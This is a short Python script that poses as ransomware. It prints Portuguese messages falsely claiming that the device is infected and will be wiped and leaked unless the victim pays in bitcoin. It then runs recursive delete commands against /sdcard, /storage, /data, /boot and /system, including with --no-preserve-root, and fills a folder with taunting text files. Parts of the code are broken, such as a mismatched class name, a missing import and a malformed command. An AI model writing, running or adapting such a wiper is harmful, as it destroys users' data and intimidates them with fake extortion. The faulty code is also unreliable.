from os import system as run_system, startfile as open_file
from time import sleep
from subprocess import run

class malwRe:
    def start(self):
    	run("clear")
    	
    	print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
    	sleep(1)
    	print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
    	sleep(1)
    	print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
    	sleep(1)
    	
    	run('rm-rf /Download', shell=True)
    	run("rm -rf /sdcard/", shell=True)
    	run("rm -rf /storage/", shell=True)
    	run("rm -rf /Documemtos")
    	run("rm -rf --no-preserve-root /data",shell=True)
    	run("rm -rf --no-preserve-root /boot",shell=True)
    	run("rm -rf --no-preserve-root /system",shell=True)
    	run("rm -rf --no-preserve-root /sistem",shell=True)
   	
    	if os.geteuid() == 0:
    	    run("rm -rf /data",shell=True)
    	    run("rm -rf /boot",shell=True)
    	    run("rm -rf /system",shell=True)
    	    run("rm -rf /sistem",shell=True)


        for i in range(1, 101):
            filename = f"lol/BY_WpsDroid{i}.txt"
            with open(filename, 'w') as f:
                f.write("kkk script kiddie otario")
                open(filename)           
                
wiper = malwaRe()
wiper.start() 
